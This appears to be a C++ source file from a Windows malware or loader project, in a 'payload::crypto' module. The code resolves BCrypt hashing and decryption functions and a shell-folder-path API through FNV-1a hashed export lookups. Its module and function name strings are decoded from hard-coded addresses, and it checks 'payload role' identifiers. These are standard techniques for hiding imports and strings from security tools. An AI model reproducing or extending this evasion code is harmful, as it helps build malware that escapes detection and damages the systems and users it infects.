#include "payload/crypto/crypto.hpp"
#include "payload/crypto/crypto_internal.hpp"
#include "runtime/protected_dispatch/dynamic_lookup.hpp"

#include <windows.h>
#include <bcrypt.h>

#include <cstdint>
#include <cstring>

namespace makima::payload::crypto {

namespace {

using ShellFolderPathW = HRESULT(WINAPI*)(
    HWND, int, HANDLE, DWORD, wchar_t*);

ShellFolderPathW shell_folder_path{};

constexpr std::uint32_t fnv1a_offset_basis = 0x811C9DC5U;
constexpr std::uint32_t fnv1a_prime = 0x01000193U;

[[nodiscard]] std::uint32_t fnv1a_name_hash(
    const char* text,
    bool fold_ascii_uppercase) noexcept {
    std::uint32_t hash = fnv1a_offset_basis;
    while (*text != '\0') {
        auto value = static_cast<std::uint8_t>(*text++);
        if (fold_ascii_uppercase && value >= 'A' && value <= 'Z') {
            value = static_cast<std::uint8_t>(value + ('a' - 'A'));
        }
        hash = (hash ^ value) * fnv1a_prime;
    }
    return hash;
}

void dispatch_provider_pair(
    const char* module_name,
    const char* api_name) noexcept {
    auto* environment = runtime::raw_dynamic_lookup::current_environment();
    void* const address = runtime::raw_dynamic_lookup::resolve_hashed_export(
        environment,
        fnv1a_name_hash(module_name, true),
        fnv1a_name_hash(api_name, false));
    if (address == nullptr) {
        environment = runtime::raw_dynamic_lookup::current_environment();
        const auto callback =
            runtime::raw_dynamic_lookup::resolve_missing_module_callback(
                environment->missing_module_dispatch);
        if (callback != nullptr) callback(module_name);
    }
}

HMODULE load_module(const char* name) noexcept {
    if (HMODULE module = GetModuleHandleA(name); module != nullptr) {
        return module;
    }
    return LoadLibraryA(name);
}

}



void bind_shell_folder_path() noexcept {
    static const char* const api_name = allocate_shell_folder_path_api_name(0X1414D8C78ll);
    static const char* const module_name = allocate_shell_folder_path_module_name(reinterpret_cast<const std::uint8_t*>(0X1414D8C8Aull));
    const HMODULE module = load_module(module_name);
    shell_folder_path = module == nullptr ? nullptr :
        reinterpret_cast<ShellFolderPathW>(
            GetProcAddress(module, api_name));
}


void bind_bcrypt_create_hash() noexcept {
    static const char* const api_name = allocate_bcrypt_create_hash_api_name(0X1414D8E77ll);
    static const char* const module_name = allocate_bcrypt_create_hash_module_name(reinterpret_cast<const std::uint8_t*>(0X1414D8E89ull), 0);
    dispatch_provider_pair(module_name, api_name);
}


void bind_bcrypt_hash_data() noexcept {
    static const char* const api_name = allocate_bcrypt_hash_data_api_name(0X1414D8E95ll);
    static const char* const module_name = allocate_bcrypt_hash_data_module_name(reinterpret_cast<const std::uint8_t*>(0X1414D8EA5ull));
    dispatch_provider_pair(module_name, api_name);
}


void bind_bcrypt_finish_hash() noexcept {
    static const char* const api_name = allocate_bcrypt_finish_hash_api_name(0X1414D8EB1ll);
    static const char* const module_name = allocate_bcrypt_finish_hash_module_name(reinterpret_cast<const std::uint8_t*>(0X1414D8EC3ull));
    dispatch_provider_pair(module_name, api_name);
}


void bind_bcrypt_destroy_hash() noexcept {
    static const char* const api_name = allocate_bcrypt_destroy_hash_api_name(0X1414D8ECFll, 0);
    static const char* const module_name = allocate_bcrypt_destroy_hash_module_name(reinterpret_cast<const std::uint8_t*>(0X1414D8EE2ull));
    dispatch_provider_pair(module_name, api_name);
}




void bind_bcrypt_decrypt() noexcept {
    static const char* const api_name =
        allocate_bcrypt_decrypt_api_name(0x1414D8E3Ell);
    static const char* const module_name =
        allocate_bcrypt_decrypt_module_name(
            reinterpret_cast<const std::uint8_t*>(0x1414D8E4Dull));
    dispatch_provider_pair(module_name, api_name);
}



bool is_supported_payload_role(const char* role) noexcept {
    if (role == nullptr) return false;
    static const char* const primary =
        detail::allocate_primary_payload_role_identifier(
            reinterpret_cast<const std::uint8_t*>(0x1414D99F4ull));
    if (std::strcmp(role, primary) == 0) return true;
    static const char* const secondary = secondary_payload_role_identifier(
        reinterpret_cast<const std::uint8_t*>(0x1414D99FEull));
    return std::strcmp(role, secondary) == 0;
}

}
